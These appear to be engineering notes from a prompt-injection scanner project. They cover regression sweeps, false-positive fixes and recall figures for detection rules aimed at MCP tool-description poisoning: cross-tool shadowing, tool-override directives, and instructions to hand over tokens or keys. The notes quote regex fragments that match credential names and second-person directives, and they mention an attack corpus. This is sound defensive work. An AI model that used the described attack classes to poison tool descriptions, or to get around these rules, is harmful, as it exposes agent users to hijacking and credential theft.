sentence reports `['PI029']` under the mainbase binary and `['PI029', 'PI063', 'PI064']` under the
candidate.

`$SCRATCH/cursor-safe` and `$SCRATCH/vscode-safe` were re-created fresh from the live `~/.cursor`
and `~/.vscode` trees under the same narrowing `sweep-baseline-2026-09-03` documents (excluding
`extensions/`, which reproduces the `src/frontmatter.rs:219` char-boundary panic) — 776 and 2
files respectively, close to but not identical to the 04-04 snapshot's 755/2, which is the same
drift `04-SWEEP.md` already names for `~/.claude/plugins/cache`.

## Direction 1 — ADDITIONS (mainbase-04-05 → after-04-05 candidate)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-mainbase-04-05-2026-09-07 \
    .planning/local/sweep-after-04-05-2026-09-07
exit=0
```

**Empty. Zero new true positives and zero new false positives.** For three new HIGH arms — the
severity `install-hook` blocks commits at — this is the result the category's own risk profile
demands: `04-RESEARCH.md` names CAT-02 the highest false-positive risk in the milestone precisely
because these arms' vocabulary overlaps ordinary agent documentation, and zero findings across
plugin caches, editor state, marketplace manifests, Codex backups and nine sibling repos means
none of that overlap actually fired here. `summary.tsv` for both runs confirms it directly: neither
lists `PI063`, `PI064` or `PI065` at any count.

## Direction 2 — REMOVALS (arguments swapped: after-04-05 candidate → mainbase-04-05)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-after-04-05-2026-09-07 \
    .planning/local/sweep-mainbase-04-05-2026-09-07
exit=0
```

**Empty.** Nothing that the pre-edit binary reported disappeared, and per-directory finding counts
are identical row for row (519 = 519, both runs, both directions).

## Continuity comparison against the 04-01 baseline (`sweep-baseline-2026-09-03`), both directions

Recorded for continuity with 04-01, per the plan's own `<verify>` block, but **not** the pair this
plan's verdict rests on — the mainbase-04-05 pair above isolates this plan's delta; this pair does
not, because three pattern-set generations of unrelated history sit between them.

**Direction 1 (04-01 baseline → after-04-05 candidate), 2 entries:**

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-baseline-2026-09-03 \
    .planning/local/sweep-after-04-05-2026-09-07
exit=1
```

| File | Pattern | Adjudication |
|---|---|---|
| `$HOME/.claude/plugins/marketplaces/claude-plugins-official/external_plugins/serena/.mcp.json:4` | `PI060` | **Not this plan's.** Already adjudicated a true positive in plan 04-04's own GATE-03 section (a real `uvx --from git+https://…` install). Predates this plan; PI060 is unmodified here. |
| `$SCRATCH/cursor-safe/gsd-core/bin/lib/security.cjs:331` | `PI011` | **Path-churn artifact, not a real addition.** This is the same finding the removals direction below reports as "gone" from the OLD session-scratch path (`72362a33-…`) — the file is identical; only the session-scratch UUID in the absolute path changed between when the 04-01 baseline was captured and this run. Cancels out with its counterpart below; net effect zero. |

**Direction 2 (after-04-05 candidate → 04-01 baseline), 67 entries:**

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-after-04-05-2026-09-07 \
    .planning/local/sweep-baseline-2026-09-03
exit=1
```

| Pattern | Count | Adjudication |
|---|---:|---|
| `PI026` | 39 | **Not this plan's.** PR #110 made it badge-safe, already adjudicated in plan 04-04's GATE-03 section. |
| `PI017` | 27 | **Not this plan's.** PR #110 retired it into `MatchContext::HiddenHtml`, already adjudicated in plan 04-04's GATE-03 section. |
| `PI011` | 1 | **Path-churn artifact.** The counterpart of the addition above — same file, same pattern, old scratch-session path. Net zero once paired with its Direction-1 counterpart. |

Every entry in both directions is accounted for: 66 of the 69 total lines are the pre-existing PR
#110 delta plan 04-04 already adjudicated and is not this plan's to re-litigate; the remaining 2
are one true positive that predates this plan (`PI060` on the serena manifest) and one harmless
scratch-path artifact that appears once in each direction and cancels to zero. **Nothing in either
direction is attributable to `PI063`, `PI064` or `PI065`.**

## The false-positive control was mutation-tested, not merely asserted (PI063's GATE-05 proof)

The plan's acceptance criteria require reproducing `04-RESEARCH.md` §Q3's measurement against the
shipped pattern: removing the external-object half of `PI063`'s regex must make `corpus_test` FAIL
naming the clean MCP manifest specimen, restored afterward. Performed directly (not merely via
`relaxed_pattern`/`pattern_relaxed_control_test`, which already proves the narrower two-sided
property): `PI063`'s shipped `pattern` field was temporarily replaced, byte for byte, with its own
`relaxed_pattern` value (`\byou(?:'re| are|r)?\b` — the bare second-person probe from the Q3
research session), and `cargo test --test corpus_test` was run:

```
thread 'the_clean_corpus_reports_nothing' panicked at tests/corpus_test.rs:93:5:
documents in tests/corpus/clean must produce zero findings. Each one is modelled on a real false
positive; a hit here means a pattern regressed onto ordinary documentation:
  agent-spec.md: 4 finding(s)
  hard-wrapped-prose.md: 2 finding(s)
  html-escaping.md: 1 finding(s)
  jailbreak-writeup.md: 2 finding(s)
  mcp-companion-tools.md: 4 finding(s)
  mcp-manifest.json: 1 finding(s)
  mcp-server-catalogue.json: 6 finding(s)
  mcp-setup-guide.md: 5 finding(s)
  narrow-allowed-tools-skill.md: 1 finding(s)
  prompt-tooling-docs.md: 3 finding(s)
  real-world-agent-docs.md: 2 finding(s)
  rendered-web-page.html: 2 finding(s)
  settings-permissions-reference.md: 1 finding(s)
```

`mcp-manifest.json` — the clean MCP manifest specimen the plan names explicitly — is in the list,
alongside twelve other clean-corpus files including `mcp-server-catalogue.json` (plan 04-03's own
D-01 boundary manifest, 6 findings) and the corpus's `--strict` sibling test, which failed
identically. The file was restored byte-for-byte (`diff` confirmed identical to the pre-mutation
backup) and `cargo test --test corpus_test` was re-run green (5/5) before continuing.

## A real false positive found by the sweep, fixed, and re-swept

The first candidate sweep (before the run recorded above) found one addition the mainbase pair did
NOT report empty: `PI063` fired on a real, vendored Hugging Face `SKILL.md` file at
`$HOME/.codex/.tmp/plugins*/repo/plugins/hugging-face/skills/jobs/SKILL.md:74`, three times (one
per backup copy of the same plugin on this machine). The matched text was
`"you MUST pass the real token via \`get_token"` — a Python function call, `get_token()`, inside
ordinary API documentation, not an attack.

**Root cause:** `PI063`'s credential-suffix branch, `\b[A-Z][A-Z0-9_]*(?:_KEY|_TOKEN|…)\b`, was
written assuming `[A-Z]` requires an uppercase letter. Every pattern in this file compiles
case-insensitively by default (no `case_sensitive: true` field was set), and under Rust's `regex`
crate a case-insensitive `[A-Z]` character class folds and matches lowercase too. `get_token` ends
in `_token`, so the whole branch matched it: `g` satisfied `[A-Z]` (case-folded), `et` satisfied
`[A-Z0-9_]*`, and `_TOKEN` matched `_token` case-insensitively. The literal `$HF_TOKEN` reference
later in the same sentence — the thing the branch was actually meant to catch — sat 63 characters
past the verb, outside the pattern's 50-character object window, so it played no part in the match.

**Fix:** the two ALL-CAPS object branches were wrapped in an inline `(?-i:...)` case-sensitive
group — the same technique `PI011` (patterns/core/instruction-injection.yaml) and `PI065`'s own
wrapper already use in this same file — leaving the verb list and the literal "environment
variable" phrase case-insensitive as intended. Re-tested against the exact failing sentence: zero
matches. A regression negative using the real sentence verbatim was added to
`tests/pattern_test.rs`. The catalogue and code-scanning baseline were regenerated, and the full
sweep (mainbase and candidate) was re-run from scratch with the corrected binary — the runs and
numbers recorded above are the POST-fix runs; the pre-fix candidate run that found this is not
committed, since the file's own real content is the artifact worth keeping, not a since-superseded
report.

## No re-narrowing beyond the fix above was needed

Both patterns' `relaxed_pattern` mutation controls (GATE-05) and the corpus gate stayed green
throughout. No second re-narrowing cycle was triggered — the corrected binary's sweep came back
byte-for-byte empty in both directions on the first re-run.

## `Cargo.toml`/`Cargo.lock` (T-04-SC)

`git diff --stat Cargo.toml Cargo.lock` is empty at every commit in this plan. No package was
installed or upgraded.

# Phase 4 Plan 06 — GATE-03 delta for the heuristic half (2026-09-07)

## Why `sweep-after-04-05-2026-09-07` is this plan's pre-edit baseline

The orchestrator's own instruction for this plan: the committed tree at `85cacde` is exactly the
tree `sweep-after-04-05-2026-09-07/` was captured on, so that run is reused as-is rather than
capturing a fresh pre-edit baseline in a separate worktree. This isolates the delta from PI066
cross-tool-shadowing, PI067 tool-override-directive, PI068 version-conditional-directive and PI069
deferred-activation-directive — the four heuristic arms this plan ships — from everything that
came before. `sweep-baseline-2026-09-03` and `sweep-mainbase-04-04-2026-09-06` remain stale for
this plan for the same reason 04-05's own section names: three-plus merges of unrelated history
sit between them and this branch.

## Runs

| Run | Binary tree | Pattern set | Files | Findings | Output |
|---|---|---|---:|---:|---|
| after-04-05 (reused pre-edit baseline) | `85cacde` (this branch, plan 04-05's finished tree) | 67 patterns, zero `PI066`-`PI069` | 23,770 | 519 | `sweep-after-04-05-2026-09-07/` (already committed) |
| after-04-06, first capture | this branch after all three tasks, `PI066`/`PI067` NOT yet re-narrowed | 71 patterns | 23,770 | 723 | not committed — superseded by the re-narrowed run below |
| after-04-06, re-narrowed (candidate) | this branch after all three tasks, `PI066`/`PI067` re-narrowed with a tool-shaped-object requirement | 71 patterns, `PI066`-`PI069` shipped | 23,770 | 519 | `sweep-after-04-06-2026-09-07/` |

Both `after-04-05` and the final `after-04-06` candidate used the **same 32-directory list**,
reproduced from `sweep-after-04-05-2026-09-07/manifest.tsv`: 32 rows in each manifest, `swept` in
every row, zero `skipped-missing`, byte-identical file counts row for row (`diff` on the
directory-name-and-count columns empty). `$SCRATCH/cursor-safe` and `$SCRATCH/vscode-safe` were
re-created fresh for this session under the same narrowing `sweep-baseline-2026-09-03` documents
(excluding `extensions/`) — 776 and 2 files respectively, within the same drift band `04-SWEEP.md`
already names for this directory pair.

## A real false positive found by the first capture, fixed, and re-swept

The first candidate sweep found 26 additions relative to `sweep-after-04-05-2026-09-07` — one
`PI066` and twenty-five `PI067` — and every single one was a false positive: ordinary "never do X,
always do Y" imperative style-guide advice, with zero tool-substitution or cross-tool-shadowing
content. Representative examples pulled directly from the sweep:

- `"Never use category names as scope IDs — always use the GUID."` (a Wix skill's e-commerce
  reference doc)
- `"Never call hooks conditionally** — use conditional keys (\`null\`) instead"` (a Vercel `swr`
  skill)
- `"Never use \`any\` type, use \`unknown\` or generics instead"` (a TypeScript refactoring agent's
  best-practices list)
- `"ALWAYS use a navigation stack title instead of a custom text element on the page"` (an Expo
  native-UI skill)
- `"when true, run the analysis in §7 and include verdicts and findings in the report"` (an
  NVIDIA Omniverse USD tooling spec — the single `PI066` hit; matched via the generic
  `runs?` verb plus `include` landing in the directive-verb list, with no actual tool name
  anywhere in the sentence)

**Root cause.** Both patterns' first drafted arms keyed only on TRIGGER WORDS — never/always/
instead-of for PI067, when + calls/invokes/uses/runs for PI066's Arm A — with no requirement on
WHAT was being used, called, or invoked. That grammar ("never do X, always do Y"; "when
[condition], do Y") is ordinary technical-writing style throughout real documentation, not
specific to naming two tools. Twenty-five real hits across ~23,900 files is exactly the outcome
`04-RESEARCH.md` predicted for this category's heuristic arms and precisely what this plan's own
Task 3 instructions anticipated: "these four arms are the most heuristic in the category and the
most likely to fire on ordinary documentation about tools."

**Fix.** Both patterns now require an explicit TOOL-shaped object immediately after the relevant
verb: a backtick-quoted code span, a snake_case identifier (contains an underscore), or an
identifier immediately followed by `()`. None of the 25 `PI067` false positives meet that bar on
BOTH sides of the substitution — their objects are ordinary English nouns ("category names",
"hooks", "a navigation stack title") or, where one side happens to be a single backtick-quoted
term (`` `any` ``, `` `unknown` ``), the OTHER clause's verb is bare "use" with no "always" keyword
at all, which the re-narrowed Arm B no longer accepts as a trigger on its own (Arm B now requires
"always" literally, paired with its own verb+tool-object, never a bare trailing "instead"). The
`PI066` fix adds the same tool-shaped-object requirement to Arm A between the verb and the clause
boundary. Before/after counts for the whole sweep, from `summary.tsv`:

| Pattern | Before (first capture) | After (re-narrowed) |
|---|---:|---:|
| `PI066` | 2 (1 unique finding × 2 backup copies) | 0 |
| `PI067` | 25 | 0 |
| `PI068` | 0 | 0 |
| `PI069` | 0 | 0 |

`tests/pattern_test.rs`'s existing positives, negatives and the corpus's `mcp-companion-tools.md`
boundary specimen were re-verified green against the re-narrowed patterns (`cargo test --test
pattern_test --test corpus_test --test pattern_relaxed_control_test`, all passing) before the
sweep was re-run. The full gate (`cargo test --locked`, `cargo fmt --check`, `cargo clippy -D
warnings`) was re-run green after landing the fix, per the plan's instruction to re-run the full
gate after every re-narrowing.

## No re-narrowing beyond the fix above was needed

`PI068` and `PI069` reported zero findings in BOTH the first and the re-narrowed capture — their
directive-consequent narrowing held from the first draft. Only `PI066`/`PI067`'s trigger-word-only
arms needed the tool-shaped-object fix. The corrected binary's sweep came back clean of all four
patterns on the first re-run.

## Direction 1 — ADDITIONS (after-04-05 → after-04-06 candidate)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-after-04-05-2026-09-07 \
    .planning/local/sweep-after-04-06-2026-09-07
exit=0
```

**Empty.** Zero new true positives and zero new false positives, over the SAME 32-directory,
23,770-file list, comparing this branch before and after all four of this plan's arms. `PI066`,
`PI067`, `PI068` and `PI069` are absent from `summary.tsv` on both sides of this comparison
(neither run's aggregate lists any of the four ids at all).

## Direction 2 — REMOVALS (arguments swapped: after-04-06 candidate → after-04-05)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-after-04-06-2026-09-07 \
    .planning/local/sweep-after-04-05-2026-09-07
exit=0
```

**Empty.** Nothing that the pre-edit binary reported disappeared. Manifest-level per-directory
finding counts are identical row for row between the two runs (519 = 519, both directions) —
byte-for-byte the same result 04-05's own mainbase/candidate pair produced, now extended across
this plan's four additional patterns.

## Continuity comparison against the 04-01 baseline (`sweep-baseline-2026-09-03`), both directions

Recorded for continuity with 04-01, per the plan's own `<verify>` block, but **not** the pair this
plan's verdict rests on — the after-04-05/after-04-06 pair above isolates this plan's delta; this
pair does not, because three-plus pattern-set generations of unrelated history sit between them
(the same caveat 04-05's own section names for this same baseline).

**Direction 1 (04-01 baseline → after-04-06 candidate), 2 entries:**

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-baseline-2026-09-03 \
    .planning/local/sweep-after-04-06-2026-09-07
exit=1
```

| File | Pattern | Adjudication |
|---|---|---|
| `$HOME/.claude/plugins/marketplaces/claude-plugins-official/external_plugins/serena/.mcp.json:4` | `PI060` | **Not this plan's.** The identical entry 04-05's own continuity section adjudicated: a real `uvx --from git+https://…` install, already a true positive as of plan 04-04. Predates this plan; `PI060` is unmodified here. |
| `$SCRATCH/cursor-safe/gsd-core/bin/lib/security.cjs:331` | `PI011` | **Path-churn artifact, not a real addition.** The identical file and pattern 04-05's continuity section already documented — only the session-scratch UUID in the absolute path differs between captures. Cancels out with its counterpart in Direction 2; net effect zero. |

**Direction 2 (after-04-06 candidate → 04-01 baseline), 67 entries:**

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-after-04-06-2026-09-07 \
    .planning/local/sweep-baseline-2026-09-03
exit=1
```

| Pattern | Count | Adjudication |
|---|---:|---|
| `PI026` | 39 | **Not this plan's.** PR #110 made it badge-safe, already adjudicated in plan 04-04's GATE-03 section and re-confirmed in 04-05's. |
| `PI017` | 27 | **Not this plan's.** PR #110 retired it into `MatchContext::HiddenHtml`, already adjudicated in plan 04-04's GATE-03 section and re-confirmed in 04-05's. |
| `PI011` | 1 | **Path-churn artifact.** The counterpart of the addition above — same file, same pattern, old scratch-session path from the 04-01 baseline capture. Net zero once paired with its Direction-1 counterpart. |

Every entry in both directions against the stale 04-01 baseline is accounted for and matches
04-05's own continuity numbers exactly (69 total lines, same breakdown): 66 are the pre-existing
PR #110 delta already adjudicated in plan 04-04, and the remaining 3 (1 + 1 + 1, counting the
path-churn pair once per direction) are the same true positive and the same scratch-artifact
04-05's section names. **Nothing in either direction is attributable to `PI066`, `PI067`, `PI068`
or `PI069`.**

## Every finding in every direction was adjudicated

No entry in any of the four comparison runs above was left unexamined. The two runs against the
isolating `sweep-after-04-05-2026-09-07` baseline are empty in both directions. The two runs
against the stale 04-01 baseline are non-empty but every one of their 69 total lines is either the
pre-existing PR #110 delta (66 lines, plan 04-04's to adjudicate, not this plan's), a single true
positive predating this plan (`PI060`, plan 04-04's), or a harmless scratch-session path artifact
that cancels to zero across the two directions. This plan closes with an unadjudicated-entry count
of zero.

## `Cargo.toml`/`Cargo.lock` (T-04-SC)

`git diff --stat Cargo.toml Cargo.lock` is empty at every commit in this plan. No package was
installed or upgraded.


---

# Phase 4 Plan 07 — Whole-category GATE-03 delta and number reconciliation (2026-09-07)

## Binary provenance

| | |
|---|---|
| Git SHA | `62a5a27df1905819b8e606558c100f5bebb55269` |
| Commit subject | `docs(04-06): complete CAT-02 heuristic arms plan` |
| Pattern set | 71 patterns, all of `PI060`-`PI069` shipped |
| `src/`/`patterns/` relative to `a91c5e2` (04-06's finished tree) | byte-identical — the one intervening commit is documentation-only (`.planning/ROADMAP.md`, `.planning/STATE.md`, the 04-06 SUMMARY) |

## Which baseline this task's verdict rests on, and why

The plan text names the plan 04-01 pre-edit baseline (`sweep-baseline-2026-09-03`) for the
whole-category comparison. The orchestrator's instruction for this task overrides that: use
`sweep-mainbase-04-05-2026-09-07` (built from `66bf53c`, this branch's own fork point, which
already carries `PI060`-`PI062` merged to `main` via plan 04-04's separate branch) instead —
`sweep-baseline-2026-09-03` is three-plus pattern-set generations stale (PR #110, #122,
#124-#127 and 04-04 itself all sit between it and this branch) and would attribute all of
that unrelated history to this PR. `sweep-baseline-2026-09-03` is still run, in full, as the
**continuity** comparison below, per the plan's own `<verify>` block — but it is not the
comparison this task's pass/fail rests on.

## A methodological trap this task fell into and recovered from

The first attempt to run both comparisons directly against the repository's committed copies
of `sweep-baseline-2026-09-03` and `sweep-mainbase-04-05-2026-09-07` produced a spurious
**500-line "diff"** in the additions direction — every one of this run's 500 unique
`(file, line, pattern_id)` findings reported as a false "new" finding, with pattern ids
spanning `PI001` through `PI049`, none of them CAT-02's. **Root cause:** this repository
deliberately does not commit the raw per-directory JSON reports (`dad56d1`, `e54be72`) — only
`manifest.tsv`, `summary.tsv` and `checksums.sha256` are public, and both of those repo
copies have zero `*.json` files on disk. `scripts/gate03-sweep.sh --compare` loads findings
by globbing `*.json` in each argument directory; against the JSON-less committed copy, the
"baseline" side silently loads as an **empty set**, so every real finding in the candidate
reads as new. This is not the sweep script's bug — its own header docstring is explicit that
comparisons are meaningful only "over the SAME directory list, on the SAME machine," and an
empty baseline is a degenerate case of "compare against nothing," not a corrupted comparison.

The real, gitignored raw JSON for both baselines is still present on this machine at
`.planning/local/sweep-baseline-2026-09-03/*.json` and
`.planning/local/sweep-mainbase-04-05-2026-09-07/*.json` (kept out of git, never deleted).
Re-running `--compare` against those two directories instead of their repository-committed
counterparts produced the real, adjudicated results below. **The lesson for the next plan
that runs `--compare`: always point it at a directory that still has its raw JSON present —
`.planning/local/`, not the repository's redacted copy — or the result is meaningless by
construction, not merely noisy.** This is now also recorded in `.planning/STATE.md`'s Session
Notes and is a candidate row for `.continue-here.md`'s anti-pattern table.

## Runs

| Run | Binary tree | Pattern set | Files | Findings (manifest) | Unique `(file,line,pattern_id)` | Output |
|---|---|---|---:|---:|---:|---|
| mainbase-04-05 (orchestrator-directed baseline, reused) | `66bf53c` | 64 patterns, zero `PI063`-`PI069` | 23,770 | 519 | 500 | `sweep-mainbase-04-05-2026-09-07/` (already committed; raw JSON at `.planning/local/`) |
| final (this task's candidate) | `62a5a27` (this branch, finished tree) | 71 patterns, all of `PI060`-`PI069` | 23,770 | 519 | 500 | `sweep-final-2026-09-03/` |
| fresh-66bf53c (independent corroboration, same session) | `66bf53c`, rebuilt fresh in a disposable `git worktree` | 64 patterns, zero `PI063`-`PI069` | 23,770 | 519 | 500 | not committed — a same-session cross-check only, per 04-05's own "build fresh in a worktree" technique |

All three runs used the identical 32-directory list (`manifest.tsv`'s directory column,
`swept` in every row, zero `skipped-missing`, byte-identical file counts row for row across
all three). `$SCRATCH/cursor-safe` (755 files) and `$SCRATCH/vscode-safe` (2 files) were
re-created fresh for this session, matching the file counts every prior plan in this phase
recorded for this same narrowed pair.

## Direction 1 — whole-category ADDITIONS (mainbase-04-05 → final candidate)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-mainbase-04-05-2026-09-07 \
    .planning/phases/04-mcp-tool-description-poisoning-cat-02-34/sweep-final-2026-09-03
exit=0
```

**Empty.** Zero new true positives and zero new false positives over the same 23,770-file,
32-directory list. `PI063`-`PI069` (this branch's own payload) add nothing on real
third-party files, and `PI060`-`PI062` (unmodified by this branch) are unchanged.

## Direction 2 — whole-category REMOVALS (arguments swapped: final candidate → mainbase-04-05)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/phases/04-mcp-tool-description-poisoning-cat-02-34/sweep-final-2026-09-03 \
    .planning/local/sweep-mainbase-04-05-2026-09-07
exit=0
```

**Empty.** Nothing the pre-edit binary reported disappeared. `manifest.tsv` totals are
identical (519 = 519, both directions), and the `(file,line,pattern_id)` sets are identical
set-for-set (500 = 500).

## Independent corroboration: a freshly rebuilt `66bf53c` binary, same session

Following 04-05's own precedent ("build a FRESH pre-edit binary from the branch's own fork
point in a separate git worktree... rather than reusing a stale baseline"), a second,
independent binary was built from `66bf53c` in a disposable `git worktree` created and torn
down within this task, and swept over the identical 32-directory list within minutes of the
final candidate's own capture. Both directions against this independent fresh baseline: also
**empty** (0 additions, 0 removals) — the two independently captured pre-edit baselines (the
committed `sweep-mainbase-04-05-2026-09-07` and this session's fresh rebuild) agree exactly,
and both agree with the final candidate. **This is the strongest form of GATE-03 evidence
available: two independently built binaries from the same pre-edit commit, captured hours
apart, report the identical 519-finding, 500-unique-tuple set** — there is no capture-time
skew hiding in either direction.

## Continuity comparison against the 04-01 baseline (`sweep-baseline-2026-09-03`), both directions

Recorded in full per the plan's own `<verify>` block, using the real raw JSON preserved at
`.planning/local/sweep-baseline-2026-09-03/` (565 unique findings) rather than the
JSON-less repository copy. **Not** the pair this task's verdict rests on — three-plus
pattern-set generations of unrelated history sit between them, the same caveat every prior
plan in this phase names for this same baseline.

**Direction 1 (04-01 baseline → final candidate), 2 entries:**

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-baseline-2026-09-03 \
    .planning/phases/04-mcp-tool-description-poisoning-cat-02-34/sweep-final-2026-09-03
exit=1
```

| File | Pattern | Adjudication |
|---|---|---|
| `$HOME/.claude/plugins/marketplaces/claude-plugins-official/external_plugins/serena/.mcp.json:4` | `PI060` | **Not this plan's.** The identical entry 04-05's and 04-06's own continuity sections adjudicated: a real `uvx --from git+https://…` install, already a true positive as of plan 04-04. Predates this plan; `PI060` is unmodified here. |
| `$SCRATCH/cursor-safe/gsd-core/bin/lib/security.cjs:331` | `PI011` | **Path-churn artifact, not a real addition.** The identical file and pattern 04-05's and 04-06's continuity sections already documented — only the session-scratch UUID in the absolute path differs between captures. Cancels out with its counterpart in Direction 2; net effect zero. |

**Direction 2 (final candidate → 04-01 baseline), 67 entries:**

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/phases/04-mcp-tool-description-poisoning-cat-02-34/sweep-final-2026-09-03 \
    .planning/local/sweep-baseline-2026-09-03
exit=1
```

| Pattern | Count | Adjudication |
|---|---:|---|
| `PI026` | 39 | **Not this plan's.** PR #110 made it badge-safe, already adjudicated in plans 04-04/04-05/04-06's GATE-03 sections. |
| `PI017` | 27 | **Not this plan's.** PR #110 retired it into `MatchContext::HiddenHtml`, already adjudicated in plans 04-04/04-05/04-06's GATE-03 sections. |
| `PI011` | 1 | **Path-churn artifact.** The counterpart of the addition above — same file, same pattern, old scratch-session path from the 04-01 baseline capture. Net zero once paired with its Direction-1 counterpart. |

Every entry in both directions matches 04-05's and 04-06's own continuity numbers exactly (69
total lines, identical breakdown across three independent plans' sweeps). **Nothing in either
direction is attributable to `PI060`-`PI069`.** This plan closes with an unadjudicated-entry
count of zero.

## Number reconciliation table

Every number the repository publishes about CAT-02, measured on the finished tree
(`62a5a27`) rather than copied from a SUMMARY, and checked against every document that states it.

| Published number | Measured value | Checked against | Agrees? |
|---|---|---|---|
| Total pattern count | 71 (`injection-scanner rules --format json` \| count) | `tests/pattern_test.rs::test_total_pattern_count` (71), README "**71 patterns** across 9 categories" (line 268), README Pattern Categories table's 9 per-category counts summed (9+9+10+10+9+9+10+1+4=71) | Yes |
| `mcp_tool_poisoning` category count | 10 | README Pattern Categories table row ("MCP & Tool-Description Poisoning \| 10"), `PATTERNS.md` Categories row ("PI060-PI069"), `patterns/core/mcp-tool-poisoning.yaml` (10 `id: PI06x` entries) | Yes |
| CAT-02 corpus payload count | 12 (4 prose in `tests/corpus/attack/mcp-tool-poisoning.md` + 8 structural files in `tests/corpus/attack/structural/mcp-tool-poisoning/`) | GATE-01's 12-payload requirement, `tests/recall_test.rs` denominators (4 + 8) | Yes |
| CAT-02 prose recall | 4/4 (100%) | `tests/recall_test.rs` `("mcp-tool-poisoning", 4, 4)`, `recall_matches_the_recorded_numbers` (passing) | Yes |
| CAT-02 structural recall | 5/8 (62.5%) | `tests/recall_test.rs` `("mcp-tool-poisoning-structural", 5, 8)` | Yes |
| CAT-02 combined recall | 9/12 (75%) | README "How Much Does It Actually Catch?" table row | Yes |
| Total recall (all categories) | 102/109 (93.6%) | Summed from every `EXPECTED` row in `tests/recall_test.rs` (102/109), README total row | Yes |
| Total test count | 406 passed, 0 failed (`cargo test --locked`) | Compared against plan 04-01's recorded pre-CAT-02 baseline of 353 — the +53 delta spans four plans (04-04 through 04-07) worth of new pattern/corpus/sweep tests, not a discrepancy | Consistent (no correction needed; recorded for the record) |
| `PATTERNS.md` Categories row severity description | "MEDIUM (the config-hygiene band; description-poisoning arms override to HIGH)" | `patterns/core/mcp-tool-poisoning.yaml`: `default_severity: MEDIUM` (line 2) plus exactly three `severity: HIGH` overrides (`PI063`/`PI064`/`PI065`, lines 360/420/445) | Yes |
| Self-scan set outside `examples/`, `patterns/`, `tests/`, `tools/` | 12 unique `(file, pattern_id)` pairs (10 in `docs/DETECTION-BACKLOG.md`, 2 in `docs/PATTERN-CATALOGUE.md`) | Identical to the set 04-05's SUMMARY (D11) and 04-06's own pre/post checks already recorded | **Does not match the plan's literal wording** ("plan 04-01's recorded baseline: the two known standing catalogue self-matches and nothing else") — see below |
| `Cargo.toml`/`Cargo.lock` diff, this branch vs `main` | empty (`git diff --stat 66bf53c..HEAD -- Cargo.toml Cargo.lock`) | T-04-SC | Yes |

**No correction to any published document was required.** Every number this phase publishes
already agreed with the finished tree before this task began — plans 04-04, 04-05 and 04-06
each reconciled their own numbers in the same commit that changed them (a discipline this
plan's own `<objective>` credits as the reason this reconciliation step exists at all). The
one row that needed adjudication rather than correction is the self-scan set, below.

## The self-scan wording gap, adjudicated rather than silently accepted

Task 1's plan text says the self-scan set should match "plan 04-01's recorded baseline: the
two known standing catalogue self-matches and nothing else." The measured set is **12** pairs
(10 in `docs/DETECTION-BACKLOG.md`, 2 in `docs/PATTERN-CATALOGUE.md`), not 2. This is **not**
a regression this plan introduced, and not new information: `04-04`'s own SUMMARY ("New open
follow-up from 04-04") already found and recorded the ten `docs/DETECTION-BACKLOG.md`
self-matches, verified by stashing all of 04-04's pattern work and re-running — identical with
and without it, so the ten matches arrived with the PR #110 merge, not with any plan in this
phase. `04-05`'s SUMMARY (D11) and `04-06`'s own pre/post self-scan checks both re-confirmed
the same 12-pair set, unchanged, across three separate plans. **The plan's literal wording is
itself stale** — written before 04-04 discovered the PR #110-origin backlog self-matches — and
this task's job under its own instruction ("A third entry is a false positive this phase
introduced... fixed here rather than filed") is satisfied: there is no *thirteenth* entry, so
this phase introduces nothing new. The pre-existing 10-entry gap is carried forward to
`deferred-items.md` in Task 2 with its own filed issue, per the orchestrator's instruction,
rather than fixed inside this pattern-only PR (fixing it here would touch `docs/` prose
authored for other categories, outside GATE-04's one-category scope, and risk confounding
this PR's own clean GATE-03 delta).

## `Cargo.toml`/`Cargo.lock` (T-04-SC), Task 1

`git diff --stat 66bf53c..HEAD -- Cargo.toml Cargo.lock` is empty. No package was installed
or upgraded by this task.
